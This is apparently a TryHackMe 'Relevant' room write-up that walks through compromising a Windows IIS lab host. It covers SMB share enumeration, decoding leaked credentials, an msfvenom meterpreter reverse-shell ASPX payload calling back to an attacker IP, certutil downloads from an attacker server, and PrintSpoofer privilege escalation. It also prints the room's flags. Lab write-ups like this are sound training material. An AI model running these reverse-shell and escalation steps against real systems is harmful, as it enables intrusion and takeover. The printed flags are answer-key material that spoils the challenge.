# TryHackMe Relevant-CTF WriteUp | Muhammad Zaid
The Relevant room is a great example of black box pentesting on a windows machine:

<img width="1536" height="427" alt="image" src="https://github.com/user-attachments/assets/bc26fb30-0443-4758-9bde-666204939696" />

the link to the room is https://tryhackme.com/room/relevant

## Step 1

scan the machine with namp

Note : scan all the ports ```-p-``` flag there is a some impotant port that you cannot get with normal scan which is this
``` bash
49663
```

<img width="556" height="121" alt="image" src="https://github.com/user-attachments/assets/4f6ef55b-4c83-42a4-89df-2e3cd4ad98bf" />

i saw port 80 open i saw the web page which was

<img width="1100" height="456" alt="image" src="https://github.com/user-attachments/assets/25681de7-7a47-4aa1-8a21-6349e0c239be" />

first thing we identified is this this is a windows machine server IIS

we can do a directory bruteforce attack adn review the source code

the source code didn’t give any intresting thing

<img width="1100" height="446" alt="image" src="https://github.com/user-attachments/assets/f95fbbd7-70c3-4360-a006-19599bde4a90" />

we can start a directory brute force

<img width="1100" height="367" alt="image" src="https://github.com/user-attachments/assets/242972eb-59fd-4961-a027-cba2d563865e" />

nothing found

let’s move to another port which is

``` bash
445
```
that is a SMB port we can connect to it

command

``` bash
smbclient -L \\Target-IP
```
i saw
<img width="962" height="265" alt="image" src="https://github.com/user-attachments/assets/0ee5df7d-416c-4120-aeed-8288916a58b1" />

``` 
nt4wrksv
```

next step is to connect with this share

<img width="1048" height="380" alt="image" src="https://github.com/user-attachments/assets/4a990567-5c19-4a96-b713-5062d6ed1f88" />

i saw a password file i downloaded that file and read the content of a file that contains base64 string then i decoded it it give this output

```
Bob - !P@$$W0rD!123Bill
Juw4nnaM4n420696969!$$$
```

you can also decode using cyberchef

we are at a point where we have no clue

now we can generate a payload from msfvenom the command goes like this

```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=Attacker IP lport=4444 -f aspx -o Shell.aspx
```

the you can put this paylaod in the SMB share

```
put Shell.aspx
```
<img width="800" height="156" alt="image" src="https://github.com/user-attachments/assets/9f894b44-f515-4305-8b61-cd8664444171" />

now start metasploit

```
msfconsole -q
```

hen use these commands one by one

```
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_tcp
 set LHOST Attacker IP
set lport 4444
```
then type
```
run
```

<img width="1087" height="490" alt="image" src="https://github.com/user-attachments/assets/604b67dd-5210-40f8-806f-c377dfe87812" />

then navigate to this url

```
http://10.112.135.32:49663/nt4wrksv/Shell.aspx
```
and press enter you will get a reverse shell with metasploit

<img width="1100" height="496" alt="image" src="https://github.com/user-attachments/assets/16ae79ae-b199-4ff3-8091-cdd1878d2ca0" />

you will get meterpreter shell just type the command

```
shell
```

to get a standard shell

then check your Privileges by typing

```
whoami /priv
```
the important misconfiguration srvice is this

```
SeImpersonatePrivilege
```

<img width="932" height="307" alt="image" src="https://github.com/user-attachments/assets/ca6e9e8b-6683-414b-bf3c-7f9cbd1f3817" />

**what it does ?**

**SeImpersonatePrivilege** (officially called “Impersonate a client after authentication”) is a Windows security right that allows a running process or service to temporarily assume the identity (security token) of another user or account to perform actions on their behalf

fist we need to identify the user.txt flag navigate to this path

```
cd C:/Users/Bob/Desktop
```
and you will see a user.txt flag

<img width="632" height="376" alt="image" src="https://github.com/user-attachments/assets/f86c7017-f304-47c1-9c11-0007713f466d" />

run the command

```
type user.txt
```
and the flag is

```
THM{fdk4ka34vk346ksxfr21tg789ktf45}
```

Escalating Privelages to administrator user

we will use a script for this task PrintSpoofer64.exe

you can install it

```
 wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
```

then start a python server on your machine
```
python -m http.server 8080
```

and also put that file on the SMB share that you enumerate

```
put PrintSpoofer64.exe
```
<img width="897" height="160" alt="image" src="https://github.com/user-attachments/assets/1978e0f2-65db-4a5f-aa92-2dcd0563cfa2" />

and also downlaod that script from the python server
```
certutil -urlcache -f http://Your-IP:8080/PrintSpoofer64.exe PrintSpoofer64.exe
```

<img width="1100" height="212" alt="image" src="https://github.com/user-attachments/assets/83d8f53c-90d1-4a5d-92c0-564eed7bb842" />

then navigate to this path

<img width="1067" height="463" alt="image" src="https://github.com/user-attachments/assets/a041fbe9-6cf6-44c4-bf89-03677c2ca402" />

<img width="936" height="557" alt="image" src="https://github.com/user-attachments/assets/5be2683b-a7d0-493d-96f4-d2561e0fde61" />

go to wwwroot

``` cd wwwroot```

<img width="1062" height="580" alt="image" src="https://github.com/user-attachments/assets/d530558e-22e5-4a29-b8ca-6000ffcee700" />


then go to nt4wrksv

and then you can see the files we put into that SMB shares

run the PrintSpoofer64.exe script

```
PrintSpoofer64.exe -i -c cmd
```

<img width="1100" height="526" alt="image" src="https://github.com/user-attachments/assets/7da49093-d831-43e1-9e01-78e0883e5af7" />

now you are a Administrator User navigate to this path

```
cd C:/Users/Administrator/Desktop
```

<img width="703" height="316" alt="image" src="https://github.com/user-attachments/assets/a7cf5892-01ca-4de8-ad1b-691c6ee91df3" />

then simply paste the root flag into the lab

```
THM{1fk5kf469devly1gl320zafgl345pv}
```

and your lab will be solved

this was amazing challenge to learn Black Box Pentesting

## Connect with me

TryHackMe Profile : https://tryhackme.com/p/muhammadzaid2009
LinkedIn Profile : https://www.linkedin.com/in/muhammad-zaid2009/
Medium Profile : https://medium.com/@muhammadzaid2009
GitHub Profile : https://github.com/muhammadzaid2009-sudo
